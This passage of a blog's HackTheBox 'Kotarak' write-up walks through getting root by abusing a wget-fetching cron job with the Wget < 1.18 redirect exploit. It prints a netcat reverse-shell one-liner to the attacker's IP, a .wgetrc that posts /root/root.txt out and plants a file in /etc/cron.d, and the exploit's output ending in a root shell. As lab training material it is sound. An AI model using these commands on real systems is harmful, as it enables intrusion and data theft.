+<span class="gp">atanas@kotarak-dmz:~$</span>
+</pre></div>
+
+
+<p>At this point I can easily read the user.txt file as indicated from the permissions below</p>
+<div class="highlight"><pre><span></span><span class="gp">atanas@kotarak-dmz:~$</span> ls -l
+<span class="go">total 4</span>
+<span class="go">-rw-rw---- 1 atanas atanas 33 Jul 19  2017 user.txt</span>
+</pre></div>
+
+
+<p>Now I remember that when I was enumerating with the tomcat user I saw a file called <code>flag.txt</code> which sounded interesting but I didn't have permissions to read it because it was owned by atanas. So I checked that file:</p>
+<div class="highlight"><pre><span></span><span class="gp">atanas@kotarak-dmz:/root$</span> cat flag.txt 
+<span class="go">Getting closer! But what you are looking for can&#39;t be found here.</span>
+</pre></div>
+
+
+<p>A bit disappointed! Anyway there is another file in the same location so I have a look as well:</p>
+<div class="highlight"><pre><span></span><span class="gp">atanas@kotarak-dmz:/root$</span> cat app.log  
+<span class="go">10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;</span>
+<span class="go">10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;</span>
+<span class="go">10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] &quot;GET /archive.tar.gz HTTP/1.1&quot; 404 503 &quot;-&quot; &quot;Wget/1.16 (linux-gnu)&quot;</span>
+</pre></div>
+
+
+<p>From this log file looks like <code>wget 1.16</code> was downloading an archive file every 2 minutes. We are going to assume we have a cronjob running every 2 minutes.</p>
+<p>A quick search with searchsploit reveals an interesting exploit for wget:</p>
+<div class="highlight"><pre><span></span><span class="go">GNU Wget &lt; 1.18 - Arbitrary File Upload / Remote Code Execution                                                                                      | exploits/linux/remote/40064.txt</span>
+</pre></div>
+
+
+<p>I studied a bit the content of the exploit, also available <a href="https://www.exploit-db.com/exploits/40064">here</a>.</p>
+<p>I suggest to read the exploit to understand the mechanism but in short this is what we are going to leverage:</p>
+<p><strong><em>Because of lack of sufficient controls in wget, when user downloads a file with wget, such as: "wget http://attackers-server/safe_file.txt" an attacker who controls the server could make wget create an arbitrary file
+with an arbitrary contents and filename by issuing a crafted HTTP 30X Redirect containing FTP server reference in response to the victim's wget request.</em></strong></p>
+<p>and...</p>
+<p><strong><em>As cron runs priodically attackers, could also write out .wgetrc file in the 
+first response and then write to /etc/cron.d/malicious-cron in the second. 
+If a cronjob is run by root, this would give them an almost instant root code 
+execution.</em></strong></p>
+<p>To cut it short, as the first thing the script will send the output of a file (by default <code>/etc/shadow</code>) back, whereas the second time it will place any piece of code we want in the cronjob that is running.</p>
+<p>I extracted the text of the <strong>wget-exploit.py</strong> and placed it in my kali box. Then I modified the following lines:</p>
+<div class="highlight"><pre><span></span><span class="n">HTTP_LISTEN_IP</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span>
+<span class="n">HTTP_LISTEN_PORT</span> <span class="o">=</span> <span class="mi">80</span>
+<span class="n">FTP_HOST</span> <span class="o">=</span> <span class="s1">&#39;10.10.14.2&#39;</span>
+<span class="n">FTP_PORT</span> <span class="o">=</span> <span class="mi">21</span>
+
+<span class="n">ROOT_CRON</span> <span class="o">=</span> <span class="s2">&quot;* * * * * rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.2 8888 &gt;/tmp/f </span><span class="se">\n</span><span class="s2">&quot;</span>
+</pre></div>
+
+
+<p>where 10.10.14.2 is the IP of my kali box. I initially used 10.10.10.55 for the HTTP_LISTEN_IP but then I realized kotarak-dmz has multiple interfaces and one of the IPs is on a different networkn thus I added 0.0.0.0 so that any interface can listen.</p>
+<p>In <code>ROOT_CRON</code> I added a command which should give us a reverse shell I dowloaded from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey reverse shell cheatsheet</a>, hence I have used my kali box IP (10.10.14.2) with a random port, 8888 in this case. Once the exploit has been edited as per above I create a simple python http listener on my kali box and I download the script in the victim machine using wget.</p>
+<p>As per the exploit instructions, we need to create a <code>.wgetrc</code> file on our kali box:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> cat <span class="s">&lt;&lt;_EOF_</span>&gt;.wgetrc
+<span class="go">post_file = /root/root.txt</span>
+<span class="go">output_document = /etc/cron.d/wget-root-shell</span>
+<span class="go">_EOF_</span>
+</pre></div>
+
+
+<p>I replaced <code>/etc/shadow</code> with <code>/root/root.txt</code> so that we can get our root.txt back.</p>
+<p>launch the following python command to create an ftp listener in our kali box:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> python -m pyftpdlib -p21 -w
+<span class="go">/usr/local/lib/python2.7/dist-packages/pyftpdlib/authorizers.py:244: RuntimeWarning: write permissions assigned to anonymous user.</span>
+<span class="go">  RuntimeWarning)</span>
+<span class="go">[I 2020-01-29 05:57:40] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=8914 &lt;&lt;&lt;</span>
+<span class="go">[I 2020-01-29 05:57:40] concurrency model: async</span>
+<span class="go">[I 2020-01-29 05:57:40] masquerade (NAT) address: None</span>
+<span class="go">[I 2020-01-29 05:57:40] passive ports: None</span>
+</pre></div>
+
+
+<p>Then we can launch </p>
+<p>After some research I found out that any reserved port (ports below 1024)requires root access to run. As a woraround we can use <strong>Authbind</strong> that is a software that allows a program that would normally require superuser privileges to access privileged network services as a non-privileged user.</p>
+<div class="highlight"><pre><span></span><span class="gp">atanas@kotarak-dmz:~$</span> authbind python wget_exploit.py 
+<span class="go">Ready? Is your FTP server running?</span>
+<span class="go">FTP found open on 10.10.14.2:21. Let&#39;s go then</span>
+
+<span class="go">Serving wget exploit on port 80...</span>
+
+
+<span class="go">We have a volunteer requesting /archive.tar.gz by POST :)</span>
+
+<span class="go">Received POST from wget, this should be the extracted /etc/shadow file: </span>
+
+<span class="go">---[begin]---</span>
+<span class="go"> 95****************************2c</span>
+
+<span class="go">---[eof]---</span>
+
+
+<span class="go">Sending back a cronjob script as a thank-you for the file...</span>
+<span class="go">It should get saved in /etc/cron.d/wget-root-shell on the victim&#39;s host (because of .wgetrc we injected in the GET first response)</span>
+<span class="go">10.0.3.133 - - [29/Jan/2020 01:44:01] &quot;POST /archive.tar.gz HTTP/1.1&quot; 200 -</span>
+
+<span class="go">File was served. Check on /root/hacked-via-wget on the victim&#39;s host in a minute! :) </span>
+
+<span class="go">We have a volunteer requesting /archive.tar.gz by GET :)</span>
+
+<span class="go">Uploading .wgetrc via ftp redirect vuln. It should land in /root </span>
+
+<span class="go">10.0.3.133 - - [29/Jan/2020 01:46:01] &quot;GET /archive.tar.gz HTTP/1.1&quot; 301 -</span>
+<span class="go">Sending redirect to ftp://anonymous@10.10.14.2:21/.wgetrc </span>
+</pre></div>
+
+
+<p>As we can see from the above output when the script runs it will give us the content of the file we specified in the .wgetrc file, in this care it returns our root.txt (95<strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em></strong><strong><em>*</em></strong>2c). Furthermore, after waiting other 2 minutes (next cronjob cycle) we get a reverse shell back since we placed the oneliner code:</p>
+<div class="highlight"><pre><span></span><span class="gp">root@SittingDucks:~#</span> nc -lvnp <span class="m">9999</span>
+<span class="go">listening on [any] 9999 ...</span>
+<span class="go">connect to [10.10.14.2] from (UNKNOWN) [10.10.10.55] 33476</span>
+<span class="go">/bin/sh: 0: can&#39;t access tty; job control turned off</span>
+<span class="gp">#</span> id
+<span class="go">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="gp">#</span> 
+</pre></div>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Kotarak.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Kotarak"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
